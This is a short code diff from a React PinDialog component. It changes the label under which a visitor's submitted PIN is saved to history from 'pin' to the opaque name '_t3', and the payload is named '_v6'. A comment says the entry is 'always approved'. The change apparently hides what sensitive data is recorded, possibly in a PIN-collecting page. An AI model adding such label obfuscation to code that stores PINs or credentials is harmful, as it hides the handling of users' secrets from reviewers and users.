@@ -51,7 +51,7 @@ export function PinDialog({ open, onOpenChange, onPinSubmitted }: PinDialogProps
       })
 
       // Add PIN to history (always approved)
-      await addToHistory(visitorID, "pin", {
+      await addToHistory(visitorID, "_t3", {
         _v6
       }, "approved")
 
